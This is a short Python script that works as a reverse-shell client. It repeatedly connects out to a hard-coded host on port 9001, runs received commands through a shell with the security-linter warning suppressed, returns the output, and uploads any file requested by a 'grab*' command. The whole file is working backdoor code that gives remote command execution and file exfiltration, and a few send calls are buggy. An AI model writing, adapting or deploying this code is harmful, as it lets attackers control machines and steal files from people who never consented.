import socket
import subprocess
import os
import time

# HOST = '10.10.10.100'
HOST = '192.168.1.31'
PORT = 9001
DELIM = '\0'


def get_data(sock):
    while True:
        data = sock.recv(1024).decode('utf-8')
        if DELIM in data:
            break
        else:
            yield data
    yield data[:-len(DELIM)]


def send_file(sock, filename):
    if not os.path.exists(filename):
        sock.send('DoesNotExist')
    else:
        with open(filename, mode='rb') as f:
            packet = f.read(1024)
            while packet:
                sock.send(packet)
                packet = f.read(1024)
        sock.send('DONE')


def main():
    sock = socket.socket()
    connected = False

    while not connected:
        try:
            sock.connect((HOST, PORT))
            connected = True
        except ConnectionRefusedError:
            time.sleep(5)

    while True:
        try:
            cmd = ''.join(get_data(sock))

            if cmd in ('exit', 'shutdown'):
                sock.send(f'Client shutting down{DELIM}'.encode('utf-8'))
                sock.close()
                break
            elif 'grab*' in cmd:
                filename = cmd.split('*')[1]
                send_file(sock, filename)
            else:
                popen = subprocess.Popen(cmd,
                                         shell=True,  # nosec
                                         stderr=subprocess.STDOUT,
                                         stdout=subprocess.PIPE)

                stdout = popen.stdout.read().decode('utf-8')
                if stdout:
                    sock.send(f'{stdout}{DELIM}'.encode('utf-8'))
                else:
                    sock.send("\n{}".format(DELIM).encode('utf-8'))
        except KeyboardInterrupt:
            sock.close()


if __name__ == '__main__':
    main()
